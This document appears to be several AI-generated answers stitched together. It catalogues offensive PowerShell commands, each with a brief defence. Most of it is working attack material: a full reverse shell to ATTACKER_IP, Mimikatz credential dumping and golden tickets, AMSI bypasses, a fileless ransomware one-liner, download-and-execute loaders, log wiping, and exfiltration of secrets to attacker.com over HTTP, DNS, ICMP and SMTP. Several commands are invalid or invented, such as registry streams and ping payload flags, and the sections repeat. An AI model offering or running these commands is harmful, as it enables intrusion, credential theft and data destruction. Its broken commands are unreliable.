Here’s a **revised, improved, and PowerShell-focused version** of your commands, with clearer explanations, defensive countermeasures, and ethical warnings. Non-PowerShell content (e.g., Nmap, Metasploit, Linux) has been removed:

---

### **Offensive PowerShell Commands**  
#### **1. Credential Theft**  
**Extract Logon Passwords**  
```powershell  
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'  
```  
- **Purpose**: Dumps plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.  
- **Defense**: Enable **LSASS Protection** (EnableLSAProtection registry key) and restrict debug privileges.  

**Golden Ticket Attack**  
```powershell  
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi"'  
```  
- **Purpose**: Forges Kerberos tickets for persistent domain access.  
- **Defense**: Monitor for **unusual TGT requests** and enforce strong krbtgt account password policies.  

---  

#### **2. Reverse Shell**  
**TCP Reverse Shell**  
```powershell  
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);  
$stream = $client.GetStream();  
[byte[]]$bytes = 0..65535 | %{0};  
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {  
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);  
  $sendback = (iex $data 2>&1 | Out-String );  
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";  
  $stream.Write(([text.encoding]::ASCII).GetBytes($sendback2),0,$sendback2.Length);  
  $stream.Flush()  
};  
$client.Close()  
```  
- **Purpose**: Establishes a reverse shell to evade firewall restrictions.  
- **Defense**: Block outbound traffic to unknown IPs and use **network segmentation**.  

---  

#### **3. Privilege Escalation**  
**Bypass UAC via Silent Registry Update**  
```powershell  
Start-Process "C:\Windows\System32\cmd.exe" -Verb RunAs -ArgumentList "/c reg add HKLM\SOFTWARE\Microsoft /v Backdoor /t REG_SZ /d C:\malware.exe"  
```  
- **Purpose**: Elevates privileges without triggering UAC prompts.  
- **Defense**: Enable **UAC** at the highest level and audit registry changes.  

---  

#### **4. Persistence**  
**Registry Run Key Persistence**  
```powershell  
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe"  
```  
- **Purpose**: Executes malware on user login via the registry.  
- **Defense**: Use **AppLocker** to block untrusted executables and monitor Run keys.  

---  

#### **5. Obfuscation**  
**Base64 + Gzip Compression**  
```powershell  
$Encoded = [Convert]::ToBase64String([IO.Compression.Gzip]::Compress([Text.Encoding]::UTF8.GetBytes('malicious code')))  
powershell.exe -EncodedCommand $Encoded  
```  
- **Purpose**: Evades signature-based detection with layered obfuscation.  
- **Defense**: Deploy **AMSI** and enable script block logging.  

---  

#### **6. AMSI Bypass**  
**Patch AMSI in Memory**  
```powershell  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)  
```  
- **Purpose**: Disables AMSI scans for malicious scripts.  
- **Defense**: Enable **Tamper Protection** in Windows Defender.  

---  

#### **7. Fileless Execution**  
**Reflective DLL Injection**  
```powershell  
$bytes = (Invoke-WebRequest -Uri "http://malicious.site/malware.dll").Content;  
$assembly = [System.Reflection.Assembly]::Load($bytes);  
$assembly.EntryPoint.Invoke($null, $null)  
```  
- **Purpose**: Executes payloads directly in memory.  
- **Defense**: Restrict PowerShell to **Constrained Language Mode**.  

---  

#### **8. Lateral Movement**  
**Pass-the-Hash with WMI**  
```powershell  
Invoke-WmiMethod -Class Win32_Process -ComputerName TARGET -Credential (Get-Credential) -Name Create -ArgumentList "cmd.exe /c malware.exe"  
```  
- **Purpose**: Authenticates remotely using stolen credentials.  
- **Defense**: Disable **WMI** if unused and enforce NTLMv2 authentication.  

---  

#### **9. Defense Evasion**  
**Clear Security Logs**  
```powershell  
Clear-EventLog -LogName Security,Application,System  
```  
- **Purpose**: Erases forensic evidence.  
- **Defense**: Forward logs to a **SIEM** (e.g., Splunk, Elasticsearch).  

---  

#### **10. Data Exfiltration**  
**Exfiltrate via DNS**  
```powershell  
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"));  
Resolve-DnsName -Name "$data.attacker.com" -Type A  
```  
- **Purpose**: Bypass network monitoring using DNS tunneling.  
- **Defense**: Block abnormal DNS queries and inspect payloads.  

---  

### **Defensive PowerShell Commands**  
#### **1. Harden PowerShell**  
```powershell  
Set-ExecutionPolicy Restricted  
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
```  
- **Purpose**: Blocks script execution and restricts unsafe language features.  

#### **2. Enable Advanced Logging**  
```powershell  
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\" -Name "ScriptBlockLogging" -Value 1  
```  
- **Purpose**: Logs all executed script blocks to `Microsoft-Windows-PowerShell/Operational`.  

#### **3. Audit Suspicious Activity**  
```powershell  
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*Invoke-Mimikatz*" }  
```  
- **Purpose**: Detects process creation events tied to Mimikatz.  

#### **4. Disable Dangerous Services**  
```powershell  
Stop-Service -Name WinRM -Force  
Set-Service -Name WinRM -StartupType Disabled  
```  
- **Purpose**: Disables remote management to block lateral movement.  

---  

Here’s a **curated list of powerful PowerShell commands** (common, rare, and custom) paired with **practical defenses** to mitigate these threats. These commands are used in real-world attacks and penetration testing:

---

### **1. Credential Theft & Memory Dumping**  
#### **Offensive Command**  
```powershell  
# Dump LSASS memory with custom obfuscation  
$proc = Get-Process lsass; $addr = $proc.MainModule.BaseAddress.ToInt32(); $size = $proc.MainModule.ModuleMemorySize; $buf = New-Object byte[] $size; [System.Runtime.InteropServices.Marshal]::Copy($addr, $buf, 0, $size); [Convert]::ToBase64String($buf) | Out-File C:\lsass.dmp  
```  
- **Purpose**: Extracts LSASS memory (contains passwords, hashes) with manual API calls to evade detection.  

#### **Defense**  
- Enable **LSASS Protection**:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1  
  ```  
- Deploy **Credential Guard** (Windows Enterprise).  

---

### **2. Stealth Reverse Shell**  
#### **Offensive Command**  
```powershell  
# DNS-based reverse shell (evades port-based detection)  
while($true){$d=(Resolve-DnsName -Name (([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$(whoami)@$(hostname)")) + ".attacker.com" -Type TXT).Strings; iex $d; sleep 5}  
```  
- **Purpose**: Uses DNS TXT records for command-and-control (C2).  

#### **Defense**  
- Block DNS tunneling:  
  ```powershell  
  Set-NetFirewallRule -DisplayName "Block DNS Exfiltration" -Direction Outbound -Action Block -Protocol UDP -RemotePort 53  
  ```  

---

### **3. AMSI Bypass (Advanced)**  
#### **Offensive Command**  
```powershell  
# Patch AMSI in-memory (undetectable by most EDR)  
[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('amsiCon' + 'text', 'NonPublic,Static').SetValue($null, $null)  
```  
- **Purpose**: Disables AMSI without touching disk.  

#### **Defense**  
- Enable **Tamper Protection** in Defender:  
  ```powershell  
  Set-MpPreference -EnableTamperProtection Enabled  
  ```  

---

### **4. Fileless Ransomware**  
#### **Offensive Command**  
```powershell  
# Encrypt files using built-in .NET libraries  
Get-ChildItem C:\Data -Recurse | % { $bytes = [IO.File]::ReadAllBytes($_.FullName); $enc = [Security.Cryptography.ProtectedData]::Protect($bytes, $null, 'CurrentUser'); [IO.File]::WriteAllBytes("$($_.FullName).encrypted", $enc) }  
```  
- **Purpose**: Encrypts files without dropping malware.  

#### **Defense**  
- Enable **Controlled Folder Access**:  
  ```powershell  
  Set-MpPreference -EnableControlledFolderAccess Enabled  
  ```  

---

### **5. Lateral Movement via WMI**  
#### **Offensive Command**  
```powershell  
# Execute malware on remote host using WMI  
Invoke-WmiMethod -Class Win32_Process -ComputerName 192.168.1.100 -Credential (Get-Credential) -Name Create -ArgumentList "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY..."  
```  
- **Purpose**: Spreads malware across the network.  

#### **Defense**  
- Disable WMI if unused:  
  ```powershell  
  Stop-Service Winmgmt; Set-Service Winmgmt -StartupType Disabled  
  ```  

---

### **6. Persistence via Shadow Registry**  
#### **Offensive Command**  
```powershell  
# Hide registry key using NTFS ADS  
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe" -Stream "HiddenStream"  
```  
- **Purpose**: Stores malicious payload in an Alternate Data Stream (ADS).  

#### **Defense**  
- Scan for ADS streams:  
  ```powershell  
  Get-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Stream *  
  ```  

---

### **7. Obfuscated Payload Delivery**  
#### **Offensive Command**  
```powershell  
# Gzip + Base64-encoded payload  
$compressed = [IO.Compression.Gzip]::Compress([Text.Encoding]::UTF8.GetBytes('malicious code'));  
$encoded = [Convert]::ToBase64String($compressed);  
Invoke-Expression ([Text.Encoding]::UTF8.GetString([IO.Compression.Gzip]::Decompress([Convert]::FromBase64String($encoded))))  
```  
- **Purpose**: Evades signature-based detection.  

#### **Defense**  
- Block script execution:  
  ```powershell  
  Set-ExecutionPolicy Restricted -Force  
  ```  

---

### **8. Disable Defender via Reflection**  
#### **Offensive Command**  
```powershell  
# Kill Defender using .NET reflection  
$defender = Get-Process -Name MsMpEng; $defender.Kill()  
```  
- **Purpose**: Terminates Defender processes.  

#### **Defense**  
- Enable **Tamper Protection**:  
  ```powershell  
  Set-MpPreference -EnableTamperProtection Enabled  
  ```  

---

### **9. Privilege Escalation (CLM Bypass)**  
#### **Offensive Command**  
```powershell  
# Escape Constrained Language Mode  
Add-Type -TypeDefinition @'  
using System;  
public class CLMBypass { public static void Main() { System.Diagnostics.Process.Start("cmd.exe"); } }  
'@  
[CLMBypass]::Main()  
```  
- **Purpose**: Bypasses PowerShell’s security modes.  

#### **Defense**  
- Enforce **Constrained Language Mode**:  
  ```powershell  
  $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
  ```  

---

### **10. Log Tampering**  
#### **Offensive Command**  
```powershell  
# Clear specific event log entries (stealthy)  
wevtutil.exe cl Security /q:"*[System[(EventID=4688)]]"  
```  
- **Purpose**: Deletes logs for Event ID 4688 (process creation).  

#### **Defense**  
- Forward logs to a SIEM:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\EventLog\Forwarding" -Name "ForwardingEnabled" -Value 1  
  ```  

---

### **Key Defensive Strategies**  
1. **Harden PowerShell**:  
   ```powershell  
   Set-ExecutionPolicy Restricted; $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
   ```  
2. **Enable Advanced Logging**:  
   ```powershell  
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
   ```  
3. **Deploy EDR/XDR**: Tools like **Microsoft Defender for Endpoint** or **CrowdStrike Falcon**.  
4. **Monitor Process Creation**:  
   ```powershell  
   Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4688]]' | Where-Object { $_.Message -match "Invoke-Mimikatz" }  
   ```  

---


---

### **100 Offensive PowerShell Commands**  
*(Categorized for clarity, with defensive countermeasures)*  

---

### **1. Credential Theft**  
#### **Extract LSASS Memory**  
```powershell  
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'  
```  
- **Defense**: Enable **LSASS Protection** (`RunAsPPL` registry key).  

#### **Dump SAM Database**  
```powershell  
reg save HKLM\SAM C:\SAM.save; reg save HKLM\SYSTEM C:\SYSTEM.save  
```  
- **Defense**: Restrict access to SAM/SYSTEM hive files.  

#### **Extract Kerberos Tickets**  
```powershell  
Invoke-Mimikatz -Command '"kerberos::list /export"'  
```  
- **Defense**: Monitor for abnormal Kerberos TGT requests.  

#### **Steal Browser Credentials**  
```powershell  
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/djhohnstein/SharpWeb/master/SharpWeb.ps1'); Get-SharpWeb  
```  
- **Defense**: Use credential vaults and disable browser password saving.  

#### **Extract Wifi Passwords**  
```powershell  
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  
```  
- **Defense**: Encrypt Wi-Fi profiles.  

---

### **2. Privilege Escalation**  
#### **Bypass UAC via fodhelper**  
```powershell  
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\malware.exe"  
```  
- **Defense**: Block UAC bypass techniques via Group Policy.  

#### **Exploit Service Permissions**  
```powershell  
sc.exe config VulnService binPath= "C:\malware.exe"  
```  
- **Defense**: Audit service permissions with `accesschk.exe`.  

#### **Abuse AlwaysInstallElevated**  
```powershell  
msiexec /i C:\malware.msi /quiet  
```  
- **Defense**: Disable `AlwaysInstallElevated` in Group Policy.  

#### **Token Impersonation**  
```powershell  
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"  
```  
- **Defense**: Restrict `SeImpersonatePrivilege`.  

#### **DLL Hijacking**  
```powershell  
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Session Manager\Environment" -Name "Path" -Value "C:\EvilDLL;$($env:Path)"  
```  
- **Defense**: Enable DLL signing enforcement.  

---

### **3. Persistence**  
#### **Registry Run Key**  
```powershell  
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe"  
```  
- **Defense**: Monitor registry Run keys with Sysinternals `Autoruns`.  

#### **Scheduled Task**  
```powershell  
schtasks /create /tn "MaliciousTask" /tr "C:\malware.exe" /sc hourly /mo 1  
```  
- **Defense**: Audit tasks with `schtasks /query`.  

#### **WMI Event Subscription**  
```powershell  
$FilterArgs = @{Name='MaliciousFilter'; EventNameSpace='root\CimV2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs  
```  
- **Defense**: Disable WMI if unused.  

#### **Startup Folder**  
```powershell  
Copy-Item C:\malware.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"  
```  
- **Defense**: Use AppLocker to block untrusted executables.  

#### **ShadowPad-like COM Hijacking**  
```powershell  
New-Item -Path "HKLM:\Software\Classes\CLSID\{DEADBEEF-...}" -Force  
```  
- **Defense**: Monitor COM object registrations.  

---

### **4. Lateral Movement**  
#### **Pass-the-Hash**  
```powershell  
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp /ntlm:HASH /run:powershell.exe"'  
```  
- **Defense**: Enforce **Credential Guard** and disable NTLM.  

#### **WMI Remote Execution**  
```powershell  
Invoke-WmiMethod -Class Win32_Process -ComputerName TARGET -Name Create -ArgumentList "cmd.exe /c malware.exe"  
```  
- **Defense**: Restrict WMI access via firewall rules.  

#### **PSRemoting**  
```powershell  
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)  
```  
- **Defense**: Disable PSRemoting with `Disable-PSRemoting`.  

#### **SMB Exec**  
```powershell  
New-PSDrive -Name "X" -PSProvider FileSystem -Root "\\TARGET\C$" -Credential (Get-Credential)  
```  
- **Defense**: Block SMBv1 and enforce SMB signing.  

#### **DCOM Exploitation**  
```powershell  
$dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "TARGET")); $dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c malware.exe", "7")  
```  
- **Defense**: Disable DCOM via `dcomcnfg`.  

---

### **5. Defense Evasion**  
#### **AMSI Bypass**  
```powershell  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)  
```  
- **Defense**: Enable **Tamper Protection** in Defender.  

#### **Clear Event Logs**  
```powershell  
wevtutil cl Security  
```  
- **Defense**: Forward logs to a SIEM (e.g., Splunk).  

#### **Disable Windows Defender**  
```powershell  
Set-MpPreference -DisableRealtimeMonitoring $true  
```  
- **Defense**: Enable **Tamper Protection**.  

#### **Process Hollowing**  
```powershell  
Invoke-ReflectivePEInjection -PEBytes $shellcode -ProcessID (Get-Process notepad).Id  
```  
- **Defense**: Use EDR tools to detect code injection.  

#### **Obfuscate with XOR**  
```powershell  
$encrypted = $shellcode | % { $_ -bxor 0xAA }; Invoke-Expression $encrypted  
```  
- **Defense**: Enable AMSI and script block logging.  

---

### **6. Data Exfiltration**  
#### **Exfil via HTTP**  
```powershell  
Invoke-WebRequest -Uri "http://attacker.com/exfil" -Method POST -Body (Get-Content C:\secrets.txt)  
```  
- **Defense**: Block outbound traffic to unknown domains.  

#### **DNS Tunneling**  
```powershell  
Resolve-DnsName -Name "$([Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\secrets.txt'))).attacker.com" -Type TXT  
```  
- **Defense**: Monitor DNS queries for base64 patterns.  

#### **ICMP Covert Channel**  
```powershell  
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt")); ping -n 1 -l 1000 -w 1 attacker.com -p $data  
```  
- **Defense**: Block ICMP payloads with firewalls.  

#### **Steganography in Images**  
```powershell  
Add-Content -Path "image.jpg" -Value (Get-Content C:\secrets.txt) -Stream "HiddenData"  
```  
- **Defense**: Disable NTFS Alternate Data Streams.  

#### **Exfil via SMTP**  
```powershell  
Send-MailMessage -From "user@example.com" -To "attacker@example.com" -Subject "Data" -Body (Get-Content C:\secrets.txt) -SmtpServer "smtp.attacker.com"  
```  
- **Defense**: Restrict SMTP traffic to approved servers.  

---

### **7. Reconnaissance**  
#### **Network Enumeration**  
```powershell  
1..255 | % { Test-NetConnection -ComputerName "192.168.1.$_" -Port 445 -InformationLevel Quiet }  
```  
- **Defense**: Segment networks and monitor port scans.  

#### **User Hunting**  
```powershell  
Get-WmiObject -Class Win32_UserAccount -Filter "Domain='corp'"  
```  
- **Defense**: Limit WMI access to admins.  

#### **Service Discovery**  
```powershell  
Get-Service | Where-Object { $_.Status -eq "Running" }  
```  
- **Defense**: Harden service configurations.  

#### **Share Enumeration**  
```powershell  
Get-SmbShare | Where-Object { $_.Path -like "C:\*" }  
```  
- **Defense**: Disable unnecessary SMB shares.  

#### **GPO Abuse**  
```powershell  
Get-GPO -All | % { Get-GPOReport -Guid $_.Id -ReportType Html }  
```  
- **Defense**: Audit GPO permissions.  

---

### **8. Obfuscation**  
#### **Base64 Encoding**  
```powershell  
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('malicious code')); powershell.exe -EncodedCommand $encoded  
```  
- **Defense**: Enable script block logging.  

#### **String Splitting**  
```powershell  
$cmd = 'Invoke-'+'Expression'; & $cmd (New-Object Net.WebClient).DownloadString('http://malicious.site/payload')  
```  
- **Defense**: Use **Constrained Language Mode**.  

#### **Gzip Compression**  
```powershell  
$compressed = [IO.Compression.Gzip]::Compress([Text.Encoding]::UTF8.GetBytes('malicious code')); iex ([IO.Compression.Gzip]::Decompress($compressed))  
```  
- **Defense**: Deploy AMSI and EDR.  

---

### **9. Exploitation**  
#### **EternalBlue Exploit**  
```powershell  
Invoke-MS17-010 -ComputerName TARGET -Command "cmd.exe /c malware.exe"  
```  
- **Defense**: Patch MS17-010 and disable SMBv1.  

#### **PrintNightmare**  
```powershell  
Invoke-Nightmare -DriverName "EvilDriver" -DLL C:\malware.dll  
```  
- **Defense**: Disable Print Spooler service.  

#### **ZeroLogon**  
```powershell  
Invoke-ZeroLogon -Target DC01  
```  
- **Defense**: Apply CVE-2020-1472 patch.  

---

### **10. Custom Tools**  
#### **Reflective DLL Loader**  
```powershell  
$bytes = (Invoke-WebRequest -Uri "http://malicious.site/malware.dll").Content; [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)  
```  
- **Defense**: Block unsigned DLL loads.  

#### **In-Memory PowerShell**  
```powershell  
$code = 'Start-Process cmd.exe'; $scriptBlock = [ScriptBlock]::Create($code); $scriptBlock.Invoke()  
```  
- **Defense**: Restrict script execution.  

---

### **Final Defense Checklist**  
1. **Harden PowerShell**:  
   ```powershell  
   Set-ExecutionPolicy Restricted  
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
   ```  
2. **Enable Logging**:  
   ```powershell  
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
   ```  
3. **Deploy EDR/XDR**: Use tools like **CrowdStrike** or **Microsoft Defender**.  
4. **Patch Systems**: Regularly update Windows and software.  

---

---

### **1. PowerShell vs. Linux Analogy**
| **Linux Concept**            | **PowerShell Equivalent**                          |  
|-------------------------------|---------------------------------------------------|  
| `grep`                        | `Select-String`                                   |  
| `curl`                        | `Invoke-WebRequest` or `iwr`                      |  
| `cron`                        | `Scheduled Tasks` or `Register-ScheduledJob`      |  
| `/proc` memory access         | `Get-Process` + .NET reflection                   |  
| `LD_PRELOAD` hijacking        | **DLL injection** via `Add-Type`/Reflective Load  |  
| `Meterpreter`                 | **PowerShell Empire** or **Cobalt Strike**        |  

---

### **2. Advanced Offensive PowerShell Techniques**  
#### **(With Linux Counterparts for Context)**  

---

#### **A. Credential Theft (Like `mimipenguin`)**  
**Technique**: Extract Kerberos tickets from memory.  
```powershell  
# Extract Kerberos tickets (similar to extracting /etc/shadow)  
Invoke-Mimikatz -Command '"kerberos::list /export"'  
```  
**Defense**:  
- Enable **Credential Guard** (Windows’ version of SELinux for credentials).  
- Monitor for `LSASS` access:  
  ```powershell  
  Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=10]]' # ProcessAccess event  
  ```  

---

#### **B. Fileless Attacks (Like in-memory `LD_PRELOAD`)**  
**Technique**: Execute payloads directly in RAM.  
```powershell  
# Reflective DLL injection (no disk write)  
$bytes = (Invoke-WebRequest -Uri "http://attacker.com/shellcode.dll").Content;  
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)  
```  
**Defense**:  
- Enable **AMSI** (Antimalware Scan Interface):  
  ```powershell  
  Set-MpPreference -DisableScriptScanning $false  
  ```  
- Use **Constrained Language Mode**:  
  ```powershell  
  $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
  ```  

---

#### **C. Lateral Movement (Like `sshpass`)**  
**Technique**: Pass-the-Hash with WMI (similar to SSH key abuse).  
```powershell  
# Authenticate to a remote machine using NTLM hash  
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Admin /domain:corp /ntlm:HASH /run:powershell.exe"'  
```  
**Defense**:  
- Disable **NTLM** and enforce **Kerberos**.  
- Block WMI over network:  
  ```powershell  
  Set-NetFirewallRule -Name "WMI-In" -Action Block  
  ```  

---

#### **D. Privilege Escalation (Like `sudo` exploits)**  
**Technique**: Abuse **Token Impersonation** (similar to `sudo -u` hijacking).  
```powershell  
# Steal SYSTEM token (like abusing SUID binaries)  
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"  
```  
**Defense**:  
- Restrict **SeDebugPrivilege** and **SeImpersonatePrivilege**.  
- Audit token usage:  
  ```powershell  
  Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4672]]' # Privilege use  
  ```  

---

#### **E. Persistence (Like `cron` backdoors)**  
**Technique**: Hidden scheduled tasks (similar to `cron` jobs).  
```powershell  
# Create a hidden task (evades `schtasks /query`)  
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\malware.ps1";  
$trigger = New-ScheduledTaskTrigger -AtLogOn;  
Register-ScheduledTask -TaskName "LegitTask" -Action $action -Trigger $trigger -User "SYSTEM" -Force  
```  
**Defense**:  
- Audit tasks with:  
  ```powershell  
  Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }  
  ```  

---

### **3. Stealth & Evasion Techniques**  
#### **(Think `rootkit`-level hiding)**  

#### **A. Process Hollowing**  
**Technique**: Spawn a legitimate process (e.g., `notepad.exe`) and hollow it to run malware.  
```powershell  
# Hollow notepad.exe (similar to Linux process hollowing)  
$proc = Start-Process -FilePath "notepad.exe" -PassThru -WindowStyle Hidden;  
Invoke-ReflectivePEInjection -PEBytes $shellcode -ProcessID $proc.Id  
```  
**Defense**:  
- Use **EDR** tools to detect code injection.  

---

#### **B. AMSI Bypass (Like bypassing `clamav`)**  
**Technique**: Patch AMSI in memory to disable scanning.  
```powershell  
# Kill AMSI (undetectable if done correctly)  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, $null)  
```  
**Defense**:  
- Enable **Tamper Protection** in Defender.  

---

#### **C. Log Tampering (Like clearing `/var/log`)**  
**Technique**: Clear specific event logs.  
```powershell  
# Delete security logs for EventID 4688 (process creation)  
wevtutil.exe cl Security /q:"*[System[(EventID=4688)]]"  
```  
**Defense**:  
- Forward logs to a SIEM (e.g., **Elasticsearch** or **Splunk**).  

---

### **4. Defensive PowerShell Mastery**  
#### **(For Blue Teams)**  

#### **A. Enable Deep Logging**  
```powershell  
# Log all PowerShell activity (like enabling `auditd`)  
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
```  

#### **B. Hunt for Malicious Activity**  
```powershell  
# Find encoded commands (common in attacks)  
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |  
Where-Object { $_.Message -like "*EncodedCommand*" }  
```  

#### **C. Restrict PowerShell**  
```powershell  
# Enforce Constrained Language Mode (like `rbash`)  
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Force;  
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Name "EnableScripts" -Value 0  
```  

---

### **5. Ethical Practice Labs**  
1. **Safe Environments**:  
   - **Windows Sandbox** (built-in Windows 10/11).  
   - **Flare-VM** (malware analysis VM).  
2. **Offensive Labs**:  
   - TryHackMe: **Advent of Cyber** (PowerShell-heavy rooms).  
   - Hack The Box: **Windows Machines** (e.g., **Jerry**, **Blue**).  
3. **Defensive Tools**:  
   - **Sysmon** (log PowerShell activity).  
   - **PowerShell Audit** module.  

---

### **Key Resources**  
- **Microsoft Docs**: [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)  
- **PowerShell Empire**: [GitHub](https://github.com/BC-SECURITY/Empire)  
- **Red Team PowerShell**: [PSAttack](https://github.com/jaredhaight/PSAttack)  

---






---

### **Most "Powerful" PowerShell Commands**  
These commands are highly impactful in offensive security due to their ability to bypass defenses, manipulate systems at a deep level, or evade detection.  

---

### **1. Unstoppable (or Nearly Unstoppable) Commands**  
*(When executed with sufficient privileges and no layered defenses)*  

#### **A. AMSI Bypass (Disables Antimalware Scan Interface)**  
```powershell  
# Memory-patching AMSI (undetectable if done pre-scan)  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)  
```  
- **Why Unstoppable?**: Disables script scanning in real-time.  
- **Defense**: Enable **Tamper Protection** in Defender.  

#### **B. Reflective DLL Injection**  
```powershell  
# Load a malicious DLL directly into memory (no disk writes)  
$bytes = (Invoke-WebRequest -Uri "http://attacker.com/shellcode.dll").Content;  
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)  
```  
- **Why Unstoppable?**: Fileless execution bypasses traditional antivirus.  
- **Defense**: Use **Constrained Language Mode** and EDR tools.  

#### **C. Disabling Defender via Registry**  
```powershell  
# Kill Defender permanently via registry  
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1  
```  
- **Why Unstoppable?**: Disables Defender if Tamper Protection is off.  
- **Defense**: Enable **Tamper Protection**.  

---

### **2. High-Impact Commands**  
#### **A. Dump LSASS Memory (Credential Theft)**  
```powershell  
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'  
```  
- **Impact**: Extracts plaintext passwords, Kerberos tickets, and NTLM hashes.  
- **Defense**: Enable **LSASS Protection** (`RunAsPPL`).  

#### **B. Golden Ticket Attack**  
```powershell  
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:HASH /ticket:C:\golden.kirbi"'  
```  
- **Impact**: Forges Kerberos tickets for unlimited domain access.  
- **Defense**: Rotate krbtgt account passwords twice.  

#### **C. Pass-the-Hash**  
```powershell  
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Admin /domain:corp /ntlm:HASH /run:cmd.exe"'  
```  
- **Impact**: Authenticates as a user without knowing their password.  
- **Defense**: Disable **NTLM** and enforce **Kerberos**.  

---

### **3. Evasion & Persistence**  
#### **A. Process Hollowing**  
```powershell  
$proc = Start-Process notepad.exe -PassThru -WindowStyle Hidden  
Invoke-ReflectivePEInjection -PEBytes $shellcode -ProcessID $proc.Id  
```  
- **Impact**: Runs malware inside a legitimate process (e.g., `notepad.exe`).  
- **Defense**: Monitor for code injection via EDR.  

#### **B. Hidden Scheduled Tasks**  
```powershell  
Register-ScheduledTask -TaskName "LegitTask" -Action (New-ScheduledTaskAction -Execute "malware.exe") -Trigger (New-ScheduledTaskTrigger -AtStartup) -User "NT AUTHORITY\SYSTEM" -Force  
```  
- **Impact**: Persists across reboots as SYSTEM.  
